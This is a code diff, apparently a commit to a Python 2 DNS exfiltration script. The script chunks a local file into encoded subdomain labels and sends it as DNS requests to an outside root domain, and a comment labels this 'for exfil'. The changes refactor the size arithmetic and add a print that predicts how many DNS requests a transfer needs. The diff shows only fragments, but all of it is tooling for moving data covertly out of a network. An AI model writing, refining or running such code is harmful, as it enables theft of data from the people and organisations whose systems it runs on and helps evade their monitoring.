@@ -15,7 +15,7 @@ ran= binascii.b2a_hex(os.urandom(2))
 
 #max total domain length as per RFC
 maxdomain=253
-
+maxdomainlabel=63
 #number of random bytes in requrst ID
 randsize=4
 #max size of request limit (9999999)
@@ -23,9 +23,9 @@ countsize=7
 
 # represents 57 bytes after base64 - max is 63
 subdomainsize=35
-
+spaceremaining=maxdomain-len(rootdomain)-randsize-countsize
 #calculate maximum number of blocks we can use to send data based on subdomain provided
-numblocks=(maxdomain-len(rootdomain)-randsize-countsize)/63
+numblocks=spaceremaining/maxdomainlabel
 
 chunksize=numblocks*subdomainsize
 
@@ -66,7 +66,7 @@ def sendrequest(string, count):
     except requests.exceptions.RequestException as e: 
         pass
         
-def sendFile(instr,filesize):
+def sendFile(instr):
     fullarray=[]
     
     # send start request
@@ -111,7 +111,7 @@ def sendFile(instr,filesize):
 file = open(filename, "rb")
 filesize=os.path.getsize(filename)
 
-
-sendFile(file, filesize)
+print "I predict this will take " + str(filesize/chunksize+1) + " DNS requests"
 # for exfil - send request but don't wait for response
 
+sendFile(file)
